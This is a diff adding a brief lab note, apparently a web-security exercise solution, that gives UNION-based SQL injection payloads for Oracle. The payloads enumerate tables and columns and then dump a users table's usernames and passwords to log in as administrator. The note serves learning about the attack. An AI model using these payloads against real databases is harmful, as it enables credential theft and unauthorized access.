@@ -1,0 +1,15 @@
+- SQL injection attack, listing the database contents on Oracle
+- Determine which table contains the usernames and passwords
+- Determine the column names in table
+- Output the content of the table
+- Login as the administrator user 
+
+payload:
+" ' UNION SELECT table_name, NULL FROM all_tables-- "
+
+" ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'-- "
+
+PASSWORD_MDZPLP
+USERNAME_EREOQW
+
+" ' UNION select USERNAME_EREOQW, PASSWORD_MDZPLP from USERS_AHIWTZ-- "
